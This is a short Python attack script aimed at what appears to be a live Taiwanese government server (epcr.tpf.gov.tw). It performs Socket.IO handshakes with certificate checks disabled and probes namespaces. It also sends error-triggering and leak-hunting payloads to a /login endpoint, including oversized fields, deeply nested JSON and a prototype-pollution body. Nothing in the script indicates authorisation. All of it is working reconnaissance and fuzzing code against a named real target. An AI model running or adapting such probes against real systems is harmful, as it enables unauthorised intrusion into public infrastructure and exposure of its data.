import requests, urllib3, json
urllib3.disable_warnings()
S = requests.Session(); S.verify=False
UA={"User-Agent":"Mozilla/5.0"}

print("===== Engine.IO handshake (socket.io v1, EIO=3) =====")
for base in ["https://epcr.tpf.gov.tw:4000","https://epcr.tpf.gov.tw:4002"]:
    try:
        r = S.get(base+"/socket.io/?EIO=3&transport=polling", timeout=12, headers=UA)
        print(f"\n{base} handshake: {r.status_code} :: {r.text[:120]}")
        # extract sid
        import re
        m = re.search(r'"sid":"([^"]+)"', r.text)
        if m:
            sid = m.group(1)
            # connect default namespace
            r2 = S.get(f"{base}/socket.io/?EIO=3&transport=polling&sid={sid}", timeout=12, headers=UA)
            print(f"  ns-conn(sid) => {r2.status_code} :: {r2.text[:120]}")
            # try a namespace handshake via polling with nspack
            for ns in ["/", "/auth","/video","/monitor","/server"]:
                r3 = S.get(f"{base}/socket.io/?EIO=3&transport=polling&sid={sid}", timeout=12, headers=UA)
            # emit an event on default namespace: Engine.IO msg: 4 + JSON
            msg = "4[\"init\"]"
            r4 = S.get(f"{base}/socket.io/?EIO=3&transport=polling&sid={sid}&msg={msg}", timeout=12, headers=UA)
            print(f"  emit init => {r4.status_code} :: {r4.text[:120]}")
    except Exception as e:
        print(f"  ERR {e}")

print("\n===== Error-trigger / leak probes on :4004 =====")
probes = {
 "malformed_json": '({"username":)',
 "huge_key": json.dumps({"username":"a"*50000,"password":"b"*50000}),
 "deep_nested": json.dumps({"a":[{"b":[{"c":[{"d":"e"*100}]*50}]*50}]*50}),
 "proto_pollute": json.dumps({"username":"a","password":"b","__proto__":{"polluted":"yes"},"constructor":{"prototype":{"x":"1"}}}),
 "null_body": None,
 "array_body": json.dumps([1,2,3]),
 "string_body": "notjson",
}
for label, body in probes.items():
    h={"Content-Type":"application/json","Origin":"https://epcr.tpf.gov.tw:4004"}
    try:
        r=S.post("https://epcr.tpf.gov.tw:4004/login", data=body, timeout=20, headers=h)
        print(f"[{label}] => {r.status_code} {r.headers.get('content-type','')[:30]} :: {r.text[:160]!r}")
    except Exception as e:
        print(f"[{label}] EXC {e}")
print("done")
